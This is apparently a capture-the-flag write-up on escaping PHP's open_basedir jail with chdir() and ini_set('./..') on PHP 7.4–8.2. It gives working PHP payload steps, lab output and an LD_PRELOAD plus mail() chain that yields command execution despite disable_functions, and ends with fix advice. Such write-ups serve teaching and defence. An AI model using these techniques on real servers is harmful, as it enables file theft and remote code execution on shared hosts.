# 18 — PHPlayground: `ini_set()` walks out of the jail — Writeup

## TL;DR

`open_basedir` is `PHP_INI_ALL`, so a script can change it — the runtime
handler only refuses values that are *less* restrictive than the current one.
That check is fooled by relative paths: `chdir()` one level below the jail
root, set `open_basedir` to `./..` (accepted, because it expands to the current
jail root), then `chdir('..')` repeatedly. Because a relative `open_basedir` is
re-expanded against the cwd on every filesystem check, the jail follows you up
to `/`. Read `/flag.txt`. `disable_functions` never enters into it — and even
that is bypassable with `putenv('LD_PRELOAD')` + `mail()`.

Flag: `PHRACK{ini_set_walked_right_out_of_the_open_basedir}`

## The bug

### The sandbox

- **Image:** `php:8.2.33-apache` (Debian 13 "trixie", glibc 2.41), mod_php on
  Apache 2.4 / mpm_prefork.
- **`open_basedir`** is pinned per-directory by Apache:

  ```apache
  <Directory /var/www/sandbox>
      php_value open_basedir /var/www/sandbox/
  </Directory>
  ```

- **`disable_functions`** (php.ini) strips `system, exec, shell_exec,
  passthru, popen, pclose, proc_open, proc_*, pcntl_*, dl, symlink, link,
  imap_open, fsockopen, stream_socket_*, curl_*, ftp_*, ...` — every obvious
  way to spawn a process or open a socket.
- The evaluator simply `eval()`s `$_POST['code']` inside that directory.

`file_get_contents('/flag.txt')` returns `false`: the flag is at `/flag.txt`,
the jail is `/var/www/sandbox/`.

### `PHP_INI_ALL` vs `PHP_INI_SYSTEM` — the design mistake

Every ini directive has an *access level* that says **who** may change it and
**when** (`php-src/main/php_ini.h`):

| level            | value | who can set it                                   |
|------------------|-------|--------------------------------------------------|
| `PHP_INI_USER`   | 1     | scripts, at runtime, via `ini_set()`             |
| `PHP_INI_PERDIR` | 2     | `.htaccess`, `php_value`, `.user.ini`            |
| `PHP_INI_SYSTEM` | 4     | `php.ini`, `php_admin_value` — **not** scripts   |
| `PHP_INI_ALL`    | 7     | all of the above                                 |

On the challenge image (measured with `ini_get_all()`):

| directive           | access          | note                                      |
|---------------------|-----------------|-------------------------------------------|
| `open_basedir`      | **`PHP_INI_ALL`** | writable from a script — the whole point  |
| `disable_functions` | `PHP_INI_SYSTEM`  | consumed once at startup; `ini_set` fails |
| `disable_classes`   | `PHP_INI_SYSTEM`  | same                                      |
| `allow_url_include` | `PHP_INI_SYSTEM`  | can't be turned back on at runtime        |
| `extension_dir`     | `PHP_INI_SYSTEM`  | can't be repointed to load a rogue `.so`  |

`open_basedir` being `PHP_INI_ALL` is deliberate: the manual advertises that
you can *tighten* it at runtime (`/www/` → `/www/tmp/`). The catch is **how**
the "is this tighter?" test is implemented.

The other trap is `php_value` vs `php_admin_value`. Both pin `open_basedir` for
the directory and look identical in `phpinfo()`, but only `php_admin_value`
also drops the directive's access level to `PHP_INI_SYSTEM`. Measured on this
image:

| Apache directive               | reported access | `ini_set('open_basedir', …)` |
|--------------------------------|-----------------|------------------------------|
| `php_admin_value open_basedir` | `PHP_INI_SYSTEM`| **refused** (returns `false`)|
| `php_value open_basedir`       | `PHP_INI_ALL`   | **allowed**                  |
| `open_basedir` in `php.ini`    | `PHP_INI_ALL`   | allowed                      |

The lab uses `php_value` on purpose — this is the real-world misconfiguration
that makes the escape possible. Had the operator written `php_admin_value`, the
runtime escape below would be dead on arrival (the CLI, which has no per-dir
config, is `PHP_INI_ALL` and always vulnerable).

### The runtime tightening check

`OnUpdateBaseDir()` in `php-src/main/fopen_wrappers.c` (PHP 7.4–8.2) is what
runs when a script calls `ini_set('open_basedir', X)`:

```c
/* Is the proposed open_basedir at least as restrictive as the current? */
ptr = pathbuf = estrdup(ZSTR_VAL(new_value));
while (ptr && *ptr) {
    ...
    if (ptr[0]=='.' && ptr[1]=='.' && (ptr[2]=='\0' || IS_SLASH(ptr[2]))) {
        /* Don't allow paths with a leading ".." at runtime */
        return FAILURE;
    }
    if (php_check_open_basedir_ex(ptr, 0) != 0) {
        /* the new component is outside the current jail -> refuse */
        return FAILURE;
    }
    ptr = end;
}
*p = ZSTR_VAL(new_value);   /* accept, verbatim string */
return SUCCESS;
```

Two flaws combine:

1. The anti-`..` guard is a **textual** check for a *leading* `..` component. It
   does not canonicalise the path. `./..` sails past it.
2. On success it stores the **raw string** (`./..`), not a resolved absolute
   path. Every later filesystem access re-expands that relative string against
   the **current** working directory — and `chdir()` is not restricted.

`php_check_specific_open_basedir()` even documents the relative-basedir case:
`strcmp(basedir, ".")` triggers "use the script's current directory". The whole
mechanism assumes the basedir is absolute; feed it a relative one and it
becomes a moving target you control with `chdir()`.

## Building the exploit

Probe first (this is stage 0 of `solve/solve.py`):

```
system() exists : false            <- disable_functions works
naive read      : false            <- /flag.txt is outside the jail
straight ini_set: false            <- ini_set('open_basedir','/') refused
dotdot  ini_set : false            <- ini_set('open_basedir','..') refused
```

Now the escape, step by step:

```php
mkdir('esc');            // create a directory *inside* the jail
chdir('esc');            // cwd = /var/www/sandbox/esc  (one below the root)

ini_set('open_basedir', './..');
// '.' + '/..'  -> not a leading '..', so the textual guard passes.
// expanded from the cwd: /var/www/sandbox/esc/..  ==  /var/www/sandbox,
// which is inside the current jail -> php_check_open_basedir_ex() is happy.
// stored verbatim as the RELATIVE string "./.."

chdir('..');  // cwd = /var/www/sandbox   ; jail "./.." now means /var/www
chdir('..');  // cwd = /var/www           ; jail "./.." now means /
chdir('..');  // cwd = /                  ; jail "./.." now means /  (root)

ini_set('open_basedir', '/');           // pin it wide open, now allowed
file_get_contents('/flag.txt');         // PHRACK{...}
```

Observed against the running lab:

```
S1 cwd            = /var/www/sandbox/esc_f56e...
S1 ini_set('./..')= '/var/www/sandbox/'   (previous value; success)
S1 open_basedir   = ./..
S1 cwd            = /
S1 ini_set('/')   = './..'                (success)
S1 open_basedir   = /
FLAG:PHRACK{ini_set_walked_right_out_of_the_open_basedir}
```

### Version matrix (measured in this environment)

The `./..` trick depends on the *exact* form of the runtime guard. Tested with a
fresh PHP process per case, jail `= /sandbox/work/`, cwd one level below:

| PHP     | `ini_set('..')` | `ini_set('./..')` | full escape to `/` |
|---------|-----------------|-------------------|--------------------|
| 5.6.24  | accepted        | accepted          | **yes** (either)   |
| 7.0.9   | accepted        | accepted          | **yes**            |
| 7.2.23  | accepted        | accepted          | **yes**            |
| 7.4.33  | refused         | accepted          | **yes** (`./..`)   |
| 8.1.34  | refused         | accepted          | **yes** (`./..`)   |
| 8.2.33  | refused         | accepted          | **yes** (`./..`)   |
| 8.3.33  | accepted        | accepted          | **no**             |
| 8.4.25  | accepted        | accepted          | **no**             |

The leading-`..` guard appears around PHP 7.4. It is a band-aid: `./..` still
works up to and including 8.2. **PHP 8.3 fixed it properly** — `OnUpdateBaseDir`
now canonicalises each component with `expand_filepath()` *before* the
restrictiveness check and stores the resolved absolute path, so a relative
value no longer tracks the cwd. On 8.3/8.4 `ini_set('..')` "succeeds" but stores
the useless literal `..`, and the walk-up dies at the first `chdir('..')`.

## The exploit

`solve/solve.py` (Python 3 stdlib only) POSTs base64'd PHP to
`/sandbox/run.php`:

- **stage 0** — prints what the jail forbids (proves it is real).
- **stage 1** — the `mkdir`/`chdir`/`ini_set('./..')` walk above; scrapes the
  `FLAG:` line. This is what `verify.sh` asserts.
- **stage 2** (`--rce`, optional) — see below.

```sh
$ make solve
[1] open_basedir escape
    ...
    FLAG:PHRACK{ini_set_walked_right_out_of_the_open_basedir}
FLAG: PHRACK{ini_set_walked_right_out_of_the_open_basedir}
```

## Command execution despite `disable_functions` (stage 2, verified)

`disable_functions` only removes the *named* functions. `putenv()` and `mail()`
are not on the list, and that is enough:

1. `mail()` shells out through `popen(sendmail_path, "w")`, i.e. it
   `execve()`s `/bin/sh -c '/usr/sbin/sendmail -t -i'`.
2. `/bin/sh` honours `LD_PRELOAD`, and `putenv('LD_PRELOAD=…')` set it for the
   child.
3. Our `.so`'s `__attribute__((constructor))` runs during dynamic linking —
   *before* sh even tries (and fails) to exec the non-existent sendmail — so it
   does not matter that this image ships no MTA.

`solve/hook.c` reads a command from `PWN_CMD`, clears both env vars so the
shell it spawns does not re-load the hook, and runs it. Build it to match the
challenge image (Debian 13 / glibc 2.41) with `make preload`, then:

```sh
$ make rce
[2] RCE via putenv(LD_PRELOAD) + mail()
    S2 command output:
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    Linux 6.1.0-52-amd64 x86_64
    PHRACK{ini_set_walked_right_out_of_the_open_basedir}
```

**Verified on this image.** Note the payload writes the `.so` and reads it back
through the escaped `open_basedir`, so stage 2 builds on stage 1.

### What does *not* work on this image (tested, not shipped)

- **`imap_open()` / CVE-2018-19518.** The classic
  `imap_open('{x -oProxyCommand=…}INBOX', …)` RCE needs `ext-imap` linked
  against `libc-client`. That extension is **not built into `php:8.2-apache`**,
  and its Debian package (`libc-client2007e`) is **gone from Debian 13**, so it
  cannot be installed on this base. I built it on `php:7.4.33-cli` (Debian 11,
  where the package still exists) and confirmed the CVE is dead there too: the
  Debian `libc-client 8:2007f~dfsg-7+b1` carries the upstream fix, so even with
  `imap.enable_insecure_rsh=1` the `-oProxyCommand` payload is passed as a
  hostname (`imap_errors()` → "No such host as x -oProxyCommand=…") and no
  command runs. Shipping it would mean shipping a downgraded, patched-out
  library; the LD_PRELOAD route is cleaner and actually fires.
- **`FFI`.** `class_exists('FFI')` is `false` — ext-ffi is not built in.
- **`proc_open` / `pcntl_exec` / `popen`.** On the disable list.
- **`dl()`** to load a rogue extension — disabled, and `extension_dir` is
  `PHP_INI_SYSTEM` so it can't be repointed anyway.

## Fixing it

1. **Do not treat `open_basedir` as a security boundary.** The manual is blunt:

   > `open_basedir` is just an extra safety net, that is in no way
   > comprehensive, and can therefore not be relied upon when security is
   > needed.

   For real isolation run untrusted PHP in a container/VM/`seccomp` jail, as a
   dedicated low-privilege user, on a filesystem that simply does not contain
   the secret.

2. If you must use `open_basedir`, set it with **`php_admin_value`** (or in the
   system `php.ini`), never `php_value`/`.user.ini`/`ini_set`. That makes it
   `PHP_INI_SYSTEM` and the runtime rewrite fails outright.

3. Upgrade to **PHP ≥ 8.3**, where `OnUpdateBaseDir` canonicalises the value
   before storing it, killing both `..` and `./..`.

4. Never `eval()` attacker input. `disable_functions` is a deny-list; treat it
   as defence-in-depth, not a sandbox. The `putenv`+`mail`+`LD_PRELOAD` chain
   (and its `getenv`/`error_log` cousins) shows why deny-lists always lose.

## Going further

- **Blaklis' *Phuck3*** (the technique's namesake) chained a very similar
  `open_basedir` escape with a bespoke `disable_functions` bypass under a custom
  PHP hardening patch. The `chdir`/`ini_set` idea is folklore that predates it;
  loknop, Orange and others have reused it in many jail challenges.
- **Other `mail()`-free LD_PRELOAD triggers:** `error_log($msg, 1, …)` also
  reaches `sendmail`; `putenv`+`mb_send_mail` is the same primitive.
- **The 8.3 fix is not the end.** `open_basedir` still does not restrict Unix
  domain sockets (the manual's own warning), so `fsockopen('unix:///…')` — if it
  were allowed — reaches sockets regardless. This lab disables the socket
  functions, but a laxer deny-list would leave that door open.
- **Symlink races:** with `symlink()` available (here it is disabled), you can
  sometimes point a name inside the jail at a target outside it between the
  `open_basedir` check and the `open()`.

## References

- Orange Tsai, "The Art of PHP — My CTF Journey and Untold Stories!", Phrack
  #72, *Honorable Mention*.
- Blaklis, *Phuck3* (InsomniHack Finals 2019):
  <https://github.com/Blaklis/my-challenges/tree/master/phuck3>
- PHP bug #76428 / CVE-2018-19518, `imap_open` command execution:
  <https://bugs.php.net/bug.php?id=76428>
- PHP manual, `open_basedir`: <https://www.php.net/manual/en/ini.core.php>
- PHP manual, "Where a configuration setting may be set" (ini access levels):
  <https://www.php.net/manual/en/configuration.changes.modes.php>
- `php-src/main/fopen_wrappers.c` — `OnUpdateBaseDir`,
  `php_check_specific_open_basedir` (PHP-7.4.33 and PHP-8.3 branches).
